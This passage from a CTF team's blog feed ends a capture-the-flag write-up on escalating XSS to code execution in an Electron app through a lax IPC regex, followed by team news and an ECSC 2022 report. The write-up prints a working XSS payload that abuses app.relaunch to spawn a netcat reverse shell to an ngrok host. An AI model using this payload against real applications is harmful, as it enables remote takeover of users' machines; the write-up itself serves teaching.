+<p>Now we need to get RCE with the XSS.
+Hacktricks has a nice atricle on how to get RCE from XSS in electon: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps
+As contextIsolation is tured on - <code class="language-plaintext highlighter-rouge">contextIsolation: true</code> in main.js, we figured, that we could give it a try via RCE via IPC.</p>
+
+<p>The preload.js contained the following:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">RendererApi</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="na">invoke</span><span class="p">:</span> <span class="p">(</span><span class="nx">action</span><span class="p">,</span> <span class="p">...</span><span class="nx">args</span><span class="p">)</span>  <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nx">ipcRenderer</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">RELaction</span><span class="dl">"</span><span class="p">,</span><span class="nx">action</span><span class="p">,</span> <span class="nx">args</span><span class="p">);</span>
+  <span class="p">},</span>
+<span class="p">};</span>
+</code></pre></div></div>
+<p>It looks like we have a ipc method called <code class="language-plaintext highlighter-rouge">invoke</code>.
+Lets check which function it allows us to execute in main.js:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nx">RELbuy</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">listingId</span><span class="p">){</span>
+  <span class="k">return</span>
+<span class="p">}</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">RELsell</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">houseId</span><span class="p">,</span> <span class="nx">price</span><span class="p">,</span> <span class="nx">duration</span><span class="p">){</span>
+  <span class="k">return</span>
+<span class="p">}</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">RELinfo</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">houseId</span><span class="p">){</span>
+  <span class="k">return</span>
+<span class="p">}</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">RElist</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">listingId</span><span class="p">){</span>
+  <span class="k">return</span>
+<span class="p">}</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">RELsummary</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">userId</span><span class="p">){</span>
+ <span class="k">return</span> 
+<span class="p">}</span>
+
+<span class="nx">ipcMain</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="dl">"</span><span class="s2">RELaction</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">_e</span><span class="p">,</span> <span class="nx">action</span><span class="p">,</span> <span class="nx">args</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
+  <span class="c1">//if(["RELbuy", "RELsell", "RELinfo"].includes(action)){</span>
+  <span class="k">if</span><span class="p">(</span><span class="sr">/^REL/i</span><span class="p">.</span><span class="nf">test</span><span class="p">(</span><span class="nx">action</span><span class="p">)){</span>
+    <span class="nx">app</span><span class="p">[</span><span class="nx">action</span><span class="p">](...</span><span class="nx">args</span><span class="p">)</span>  
+  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="c1">// ?? </span>
+  <span class="p">}</span>
+<span class="p">})</span>
+</code></pre></div></div>
+
+<p>It looks like we can execute every method that starts with REL. However, the regex check is case insensitive.
+Lets see if we can find an electon api app function whose name start with <code class="language-plaintext highlighter-rouge">rel</code> that might be useful. 
+We find <code class="language-plaintext highlighter-rouge">relaunch</code> https://www.electronjs.org/de/docs/latest/api/app</p>
+
+<p>After a bit of trial and error and reading the docs, we could achive RCE with this javascript function: 
+<code class="language-plaintext highlighter-rouge">api.invoke("relaunch", {args: ["4.tcp.ngrok.io", "133573", "-e", "/bin/bash"], execPath:"nc"})</code></p>
+
+<p>Now we just needed to put that into our XSS script and let the bot visit it to get a reverse shell back.</p>
+
+<p>We posted that to /sell:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"message"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;img src=x onerror=</span><span class="se">\'</span><span class="s2">api.invoke('relaunch', {args: ['4.tcp.ngrok.io', '133573', '-e', '/bin/bash'], execPath:'nc'})</span><span class="se">\"</span><span class="s2">&gt;"</span><span class="w">
+</span></code></pre></div></div>
+<p>We then got the id back, which we then submitted to the bot and got a shell back. The shell only lasted for 15 secs, so we needed to be quick to print out both flag ^^. but after some attemts we got both flags.</p>
+
+<p>Big thanks to Alain who helped a lot during the challenge. :)</p>]]></content><author><name>Mike L.</name></author><category term="writeup" /><summary type="html"><![CDATA[Description So you wanted to get into Electron Pwning? Your friend found a nice app, leaked its backend source from a Github repo he found while doxing some Luxembourg Real Estate Company. Pwn away by getting RCE! If you run into problems while setting it up reach out. This is the first flagstore for babyelectron.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/electron.png" /><media:content medium="image" url="/electron.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">LetzPwn is officially an NPO and other news</title><link href="/news/2022/10/20/asbl_and_awards.html" rel="alternate" type="text/html" title="LetzPwn is officially an NPO and other news" /><published>2022-10-20T11:37:25+00:00</published><updated>2022-10-20T11:37:25+00:00</updated><id>/news/2022/10/20/asbl_and_awards</id><content type="html" xml:base="/news/2022/10/20/asbl_and_awards.html"><![CDATA[<p>Its officiall. LetzPwn is an officially registered NPO.
+We are hoping that we can have more impact as an NPO, acquiring talents at a younger age by cooperating with different institutions.
+If you are a sponsor, or if you want to have contact us regarding a CTF workshop or other, feel free to contact us at: LetzPwn@protonmail.com.</p>
+
+<p>Furthermore, the national CTF team which participated in the ECSC2022 got rewarded with the Most Promising Young Talents award by LHC.</p>
+
+<p><img src="mpyt.png" alt="" /></p>]]></content><author><name>Mike L.</name></author><category term="news" /><category term="award" /><category term="cyber security week" /><summary type="html"><![CDATA[Its officiall. LetzPwn is an officially registered NPO. We are hoping that we can have more impact as an NPO, acquiring talents at a younger age by cooperating with different institutions. If you are a sponsor, or if you want to have contact us regarding a CTF workshop or other, feel free to contact us at: LetzPwn@protonmail.com.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/npo.png" /><media:content medium="image" url="/npo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">ECSC 2022 Post Mortem</title><link href="/news/2022/09/15/ecsc-2022-finals.html" rel="alternate" type="text/html" title="ECSC 2022 Post Mortem" /><published>2022-09-15T15:10:05+00:00</published><updated>2022-09-15T15:10:05+00:00</updated><id>/news/2022/09/15/ecsc-2022-finals</id><content type="html" xml:base="/news/2022/09/15/ecsc-2022-finals.html"><![CDATA[<h1 id="letzpwn-goes-ecsc-2022">LetzPwn goes ECSC 2022</h1>
+
+<h3 id="intro">Intro</h3>
+<p>Every year the ENISA organizes the European cyber security challenge, where top cyber talents from each participating country will meet to network and collaborate and finally compete against each other.</p>
+
+<p>Contestants will be challenged in solving security related tasks, thus a classic CTF-style competition.
+This years edition took place in Austria’s capital, Vienna. The competition tool place the 14th and 15th of September.</p>
+
+<p><img src="img/ECSC22_day1_c_David_Bohmann_046_web-1030x687.jpg" alt="" /></p>
+
+<h3 id="team-luxembourg">Team Luxembourg</h3>
+<p>During the Luxembourg Cyber Security Challenge (LCSC) 2022 we gathered our brightest young CTF-players to participate in the ECSC for team luxembourg.
+Together with a two ECSC steering comitee members, a coach and a mentor, the participants made their way to Vienna.</p>
+
+<p>The first day, there was a tricky and fiddly Jeopardy CTF. It included challenges from various categories involving web, crypto, mobile security, reverse engineering and forensics. Furthermore, an escape the box game was designed, where a team of 4 participants from different countries needed to solve tasks collaboratively.</p>
+
+<p><img src="img/ECSC22_day2_c_David_Bohmann_072_web.jpg" alt="" /></p>
+
+<p>The second day, there was a more stressful Attack/Defense CTF.</p>
+
+<p>Overall, the team placed 26/33, which is a good result that we were very happy with.</p>
+
+<p><img src="img/teamfoto_white.png" alt="" /></p>
+
+<p><img src="img/overall_results.png" alt="" /></p>
+
+<p>(Pictures taken from https://www.ecsc2022.eu/photo-gallery/ copyright David Bohnmann)</p>]]></content><author><name>Mike L.</name></author><category term="news" /><category term="ECSC" /><category term="Post Mortem" /><summary type="html"><![CDATA[LetzPwn goes ECSC 2022]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/img/ECSC22_day2_c_David_Bohmann_107_web.jpg" /><media:content medium="image" url="/img/ECSC22_day2_c_David_Bohmann_107_web.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Uni CTF 2023</title><link href="/2022/09/15/UniCTF.html" rel="alternate" type="text/html" title="Uni CTF 2023" /><published>2022-09-15T13:37:00+00:00</published><updated>2022-09-15T13:37:00+00:00</updated><id>/2022/09/15/UniCTF</id><content type="html" xml:base="/2022/09/15/UniCTF.html"><![CDATA[]]></content><author><name></name></author><summary type="html"><![CDATA[N/A]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/N/A" /><media:content medium="image" url="/N/A" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">(open)ECSC 2022 CTF</title><link href="/2022/09/15/event.html" rel="alternate" type="text/html" title="(open)ECSC 2022 CTF" /><published>2022-09-15T13:37:00+00:00</published><updated>2022-09-15T13:37:00+00:00</updated><id>/2022/09/15/event</id><content type="html" xml:base="/2022/09/15/event.html"><![CDATA[]]></content><author><name></name></author><summary type="html"><![CDATA[In order to inspire even more people for this topic and to strengthen the objectives of the ECSC in the long term, the openECSC is planned in 2022 alongside the ECSC.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.ecsc2022.eu/wp-content/uploads/2022/02/ECSC-OPEN_Logo_sRGB.png" /><media:content medium="image" url="https://www.ecsc2022.eu/wp-content/uploads/2022/02/ECSC-OPEN_Logo_sRGB.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
